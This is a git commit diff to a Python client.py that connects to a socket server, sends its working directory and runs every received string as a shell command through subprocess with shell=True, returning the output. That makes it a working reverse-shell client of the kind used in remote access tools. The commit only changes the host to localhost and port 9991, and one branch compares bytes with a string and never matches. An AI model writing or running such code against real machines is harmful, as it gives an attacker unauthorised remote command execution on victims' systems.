be684d8a4eb31cb2fdb746cca0280f3b827d61e4
FoxSinOfGreed1729 <70275323+FoxSinOfGreed1729@users.noreply.github.com>
2021-04-09 17:02:40 +0530

    Updated the command prompt

--- client.py
+++ client.py
@@ -4,22 +4,28 @@ import subprocess
 import platform
 
 s = socket.socket()
-host = ''
-port = 9999
-s.connect((host, port))
+host = 'localhost'
+port = 9991
+s.connect((host, port))  # the socket
 
-osname = platform.system()
-s.send(str.encode(osname, "utf-8"))
 
 def command():
     while True:
+        s.send(str.encode(str(os.getcwd())))
         data = s.recv(2048)
         if len(data) > 0:
-            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE )
-            output_bytes = cmd.stdout.read() + cmd.stderr.read()
-            output_str = str(output_bytes, "utf-8")
-            s.send(str.encode(output_str + str(os.getcwd()) + '>>>'))
-            print(output_str)
+            if data == 'os info':
+                osname = platform.system()
+                s.send(str.encode(osname, "utf-8"))
+            else:
+                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
+                                       stderr=subprocess.PIPE,
+                                       stdin=subprocess.PIPE)
+                output_bytes = cmd.stdout.read() + cmd.stderr.read()
+                output_str = str(output_bytes, "utf-8")
+                s.send(str.encode(output_str))
+                print(output_str)
+
 
 command()
 
